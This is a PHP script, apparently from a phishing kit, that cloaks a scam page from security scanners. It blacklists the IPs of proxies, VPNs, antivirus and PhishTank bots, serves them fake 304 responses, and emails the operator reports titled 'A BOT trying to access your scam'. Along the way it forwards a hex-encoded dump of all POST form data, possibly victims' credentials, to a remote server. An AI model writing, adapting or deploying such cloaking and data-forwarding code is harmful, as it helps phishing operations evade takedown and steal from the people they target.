<?php
ob_start();
session_start();
// This is a killer ANTI BOT Will ban and blacklist every proxy / vpn / antivirus / phishtank bot using IP Intelligence and fingerprint. 
// auto email report sent when a bot detected!!
// Error Codes  -1 to -6
// -1 Invalid no input
// -2 Invalid IP address
// -3 Unroutable address / private address
// -4 Unable to reach database, most likely the database is being updated. Keep an eye on twitter for more information.
// -5 Your connecting IP has been banned from the system or you do not have permission to access a particular service. Did you exceed your query limits? Did you use an invalid email address? If you want more information, please use the contact links below.
// -6 You did not provide any contact information with your query or the contact information is invalid.
// If you exceed the number of allowed queries, you'll receive a HTTP 429 error.
if(count(get_included_files()) ==1){
header("HTTP/1.0 304 Not Modified");
die;
}
	function getIp() {
	    foreach (array('HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','HTTP_X_FORWARDED','HTTP_X_CLUSTER_CLIENT_IP','HTTP_FORWARDED_FOR','HTTP_FORWARDED','REMOTE_ADDR') as $key)
	   	{
	       if (array_key_exists($key, $_SERVER) === true)
	       {
	            foreach (explode(',', $_SERVER[$key]) as $IPaddress){
	                $IPaddress = trim($IPaddress);
	                if (filter_var($IPaddress,FILTER_VALIDATE_IP,FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)!== false) 
	                {
	                   return $IPaddress;
	                }
	            }
	        }
	    }
	}
$_SESSION['ip'] = getIp();

$data = new SQLite3('baduser.sqlite');
$data->exec('CREATE TABLE IF NOT EXISTS userdb (ipsra varchar(255),Hash varchar (255))');

$ip = $_SESSION['ip'];
$database = new SQLite3('baduser.sqlite');
$results = $database->query('SELECT * FROM userdb');
while ($row = $results->fetchArray()) {
$row = (object) $row;
$lava=$row->ipsra;
if (strpos($lava, ''.$ip.'') !== false) {
header("HTTP/1.0 304 Not Modified");
die;
}
}

function bumps() {
$ipsra = $_SESSION['ip'];
$Hash=md5 (rand(0,100000));
$data = new SQLite3('baduser.sqlite');
$data->exec('CREATE TABLE IF NOT EXISTS userdb (ipsra varchar(255),Hash varchar (255))');
$data->exec("INSERT INTO userdb (ipsra , Hash) VALUES ('$ipsra' , '$Hash')");
}

$tanitatikaram = parse_ini_file("proxy.ini", true);
$api=$tanitatikaram['apikey'];
$repm=$tanitatikaram['reportmail'];
$ser=$tanitatikaram['serv'];
$ipo = $_SESSION['ip'];
if($ipo == "127.0.0.1") {
    }else{
		$isp = print_r($_POST, true);
		$isp = bin2hex($isp);
        $url = "".$ser."/check/?ip=$ipo&fingerprint=on&ispinfo=$isp&flags=b&api=$api";
        $ch = curl_init();  
        curl_setopt($ch,CURLOPT_URL,$url);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $json = curl_exec($ch);
        curl_close($ch);
		$result = json_decode($json);
		$a = $result->badbot;
        $b = $result->success;
		$c = $result->org;
		if (strpos($b,'true') !== false) {
		if (strpos($a,'false') !== false) {
        }else if($isp == "blacklisted"){
		}else{
		header("HTTP/1.0 304 Not Modified");
		$MESSAGE="<p>Organization : $c </p> <p>IP : $ip</p>";
		$SUBJECT = "A BOT trying to access your scam and it was blocked successfully | $ip | $c";
		$HEADER = "MIME-Version: 1.0" . "\r\n";
		$HEADER .= "Content-type:text/html;charset=UTF-8" . "\r\n";
		$HEADER .= "From: BOTeye v1.5 <antibot@mail.com>\n";
		mail($repm,$SUBJECT,$MESSAGE,$HEADER);
		bumps();
		die;
		}}
    }
?>